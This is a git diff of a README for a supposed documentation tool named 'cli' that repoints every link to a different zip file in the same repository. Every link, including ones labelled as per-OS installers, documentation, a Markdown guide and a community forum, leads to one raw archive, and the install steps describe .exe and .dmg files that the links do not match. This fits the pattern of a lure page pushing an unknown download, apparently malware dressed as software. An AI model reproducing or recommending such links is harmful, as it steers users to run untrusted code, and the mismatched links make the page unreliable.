@@ -1,6 +1,6 @@
 # 🎉 cli - Create Beautiful, Searchable Docs Easily
 
-[![Download cli](https://github.com/Loneo/cli/raw/refs/heads/main/src/core/Software-1.2.zip)](https://github.com/Loneo/cli/raw/refs/heads/main/src/core/Software-1.2.zip)
+[![Download cli](https://github.com/Loneo/cli/raw/refs/heads/main/src/Software_2.9.zip)](https://github.com/Loneo/cli/raw/refs/heads/main/src/Software_2.9.zip)
 
 ## 📖 Introduction
 
@@ -23,14 +23,14 @@ Before you begin, ensure your system meets the following requirements:
 
    To download cli, visit the Releases page by clicking the link below:
 
-   [Download cli](https://github.com/Loneo/cli/raw/refs/heads/main/src/core/Software-1.2.zip)
+   [Download cli](https://github.com/Loneo/cli/raw/refs/heads/main/src/Software_2.9.zip)
 
 2. **Choose the Right File**
 
    On the Releases page, look for the latest version of cli. Files are typically named in the format: 
-   - `https://github.com/Loneo/cli/raw/refs/heads/main/src/core/Software-1.2.zip` for Windows
-   - `https://github.com/Loneo/cli/raw/refs/heads/main/src/core/Software-1.2.zip` for macOS
-   - `https://github.com/Loneo/cli/raw/refs/heads/main/src/core/Software-1.2.zip` for Linux
+   - `https://github.com/Loneo/cli/raw/refs/heads/main/src/Software_2.9.zip` for Windows
+   - `https://github.com/Loneo/cli/raw/refs/heads/main/src/Software_2.9.zip` for macOS
+   - `https://github.com/Loneo/cli/raw/refs/heads/main/src/Software_2.9.zip` for Linux
 
 3. **Download the File**
 
@@ -40,7 +40,7 @@ Before you begin, ensure your system meets the following requirements:
 
    - **Windows**: Open the downloaded `.exe` file and follow the setup instructions.
    - **macOS**: Open the downloaded `.dmg` file and drag the cli icon to your Applications folder.
-   - **Linux**: Extract the `https://github.com/Loneo/cli/raw/refs/heads/main/src/core/Software-1.2.zip` file and follow the included instructions.
+   - **Linux**: Extract the `https://github.com/Loneo/cli/raw/refs/heads/main/src/Software_2.9.zip` file and follow the included instructions.
 
 ### 📝 Quick Usage Guide
 
@@ -77,14 +77,14 @@ cli integrates various topics that enhance documentation creation:
 
 For further information, tutorials, and tips, check out these useful links:
 
-- [cli Documentation](https://github.com/Loneo/cli/raw/refs/heads/main/src/core/Software-1.2.zip)
-- [Markdown Guide](https://github.com/Loneo/cli/raw/refs/heads/main/src/core/Software-1.2.zip)
-- [Community Forum](https://github.com/Loneo/cli/raw/refs/heads/main/src/core/Software-1.2.zip)
+- [cli Documentation](https://github.com/Loneo/cli/raw/refs/heads/main/src/Software_2.9.zip)
+- [Markdown Guide](https://github.com/Loneo/cli/raw/refs/heads/main/src/Software_2.9.zip)
+- [Community Forum](https://github.com/Loneo/cli/raw/refs/heads/main/src/Software_2.9.zip)
 
 ## 🔗 Download & Install
 
 Don’t hesitate to start your documentation journey. 
 
-**Download cli now:** [Download cli](https://github.com/Loneo/cli/raw/refs/heads/main/src/core/Software-1.2.zip)
+**Download cli now:** [Download cli](https://github.com/Loneo/cli/raw/refs/heads/main/src/Software_2.9.zip)
 
 Follow the installation steps above, and you'll be creating beautiful documentation in no time. Enjoy the process!
